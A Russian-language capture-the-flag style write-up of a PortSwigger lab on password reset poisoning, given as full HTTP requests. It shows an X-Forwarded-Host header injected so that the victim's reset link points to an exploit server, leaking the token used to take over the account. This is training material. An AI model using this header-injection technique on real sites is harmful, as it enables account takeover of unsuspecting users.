---
title: "Password reset poisoning via middleware"
date: 2025-09-25
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware"
classes: wide
---

Необходимо сбросить пароль пользователя `carlos` и получить доступ к его аккаунту. Даны креды от другого аккаунта `wiener`:`peter`.

```
https://0af60053036976e780d1fd8b009000a3.web-security-academy.net
```

## Solution

Нужно осмотреться. 

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_reset_poisoning_via_middleware/1.png){: height="200" .align-center}

Попробую зайти в свой аккаунт.

```http
POST /login HTTP/2
Host: 0af60053036976e780d1fd8b009000a3.web-security-academy.net
Cookie: session=j8luZwlICJmu3udeiMAQSZ9DNgtgpNvp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&password=peter
```

В ЛК есть функция изменения почтового адреса:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_reset_poisoning_via_middleware/2.png){: height="200" .align-center}

Соберу и этот запрос:

```http
POST /login HTTP/2
Host: 0af60053036976e780d1fd8b009000a3.web-security-academy.net
Cookie: session=j8luZwlICJmu3udeiMAQSZ9DNgtgpNvp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&password=peter
```

Попробую восстановить пароль:

```http
POST /forgot-password HTTP/2
Host: 0af60053036976e780d1fd8b009000a3.web-security-academy.net
Cookie: session=2wMmGtSi26rEaRBGNX9KGnIzafS5FUi8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net/forgot-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener
```

Хмм... А если попробовать передать не имя, а почту? Посмотрим-с:

```http
POST /forgot-password HTTP/2
Host: 0af60053036976e780d1fd8b009000a3.web-security-academy.net
Cookie: session=2wMmGtSi26rEaRBGNX9KGnIzafS5FUi8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net/forgot-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=new%40mail.com
```

Ничего не изменилось. Ладно. Попробую получить ссылку для восстановления. Я восстановил почту и отправил запрос на сброс пароля. Получил вот такую ссылку:

```
https://0af60053036976e780d1fd8b009000a3.web-security-academy.net/forgot-password?temp-forgot-password-token=0t62dq17daqcgjygfv11zv7bkt4j0emk
```

Проделав все эти шаги, я получил запрос, с помощью которого изменяется пароль:

```http
POST /forgot-password?temp-forgot-password-token=mg13no2o74wta0a13z9b2z33nnz9g8uo HTTP/2
Host: 0af60053036976e780d1fd8b009000a3.web-security-academy.net
Cookie: session=gQhAp2tHdtS62xh6kW1cTuUdkL8gK5zO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net/forgot-password?temp-forgot-password-token=mg13no2o74wta0a13z9b2z33nnz9g8uo
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: https://0af60053036976e780d1fd8b009000a3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=mg13no2o74wta0a13z9b2z33nnz9g8uo&new-password-1=peter&new-password-2=
```

Итог: для сброса пароля нужно получить `temp-forgot-password-token`. Погуляв по запросам, я так и не смог его найти. Значит его нужно украсть. Как? Вопрос то хороший. У нас есть возможность отправить письмо жертве. Буду копать в эту сторону.

Попробую подставить заголовок `X-Forward-Host` в свой запрос.

```http
POST /forgot-password HTTP/2
Host: 0ad6006c036f335d80bd12c1003500dd.web-security-academy.net
Cookie: session=9AUyI5SFoyAibYfN1uEZ33qBzWoBMd4Q
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad6006c036f335d80bd12c1003500dd.web-security-academy.net/forgot-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0ad6006c036f335d80bd12c1003500dd.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-Host: exploit-0a06006703a2337280a5112f01d700f6.exploit-server.net

username=wiener
```

Зачем это нужно? Заголовок `X-Forwarded-Host` указывает, что оригинальный запрос был отправлен не от `Host`, а от хоста, который указан в этом заголовке. Для этой лабы мы получили письмо на восстановление пароля, которое указывает на эксплойт сервер. Теперь, если нажать на эту ссылку, то на сервер придет `GET`-запрос с токеном для сброса пароля. А его можно уже использовать, чтобы сбросить пароль.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_reset_poisoning_via_middleware/3.png){: height="200" .align-center}

Итак, что нужно сделать:
1. Отправить заявку на сброс пароля для пользователя `carlos` с заголовком `X-Forwarded-Host`:

```http
POST /forgot-password HTTP/2
Host: 0ad6006c036f335d80bd12c1003500dd.web-security-academy.net
Cookie: session=9AUyI5SFoyAibYfN1uEZ33qBzWoBMd4Q
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad6006c036f335d80bd12c1003500dd.web-security-academy.net/forgot-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0ad6006c036f335d80bd12c1003500dd.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-Host: exploit-0a06006703a2337280a5112f01d700f6.exploit-server.net

username=carlos
```
2. Вытащить токен из логов сервера:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_reset_poisoning_via_middleware/4.png){: height="200" .align-center}

3. Отправить запрос на изменение пароля с ликнутым токеном `8apy74zrh20eag5za6t437ci7fk0h2js`:

```http
POST /forgot-password?temp-forgot-password-token=8apy74zrh20eag5za6t437ci7fk0h2js HTTP/2
Host: 0ad6006c036f335d80bd12c1003500dd.web-security-academy.net
Cookie: session=9AUyI5SFoyAibYfN1uEZ33qBzWoBMd4Q
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad6006c036f335d80bd12c1003500dd.web-security-academy.net/forgot-password?temp-forgot-password-token=l3esv027he10meqw3bm2qeonhifvuvqj
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Origin: https://0ad6006c036f335d80bd12c1003500dd.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=8apy74zrh20eag5za6t437ci7fk0h2js&new-password-1=1&new-password-2=1
```

4. Залогиниться в аккаунт:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_reset_poisoning_via_middleware/5.png){: height="200" .align-center}

Я в системе)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_reset_poisoning_via_middleware/6.png){: height="200" .align-center}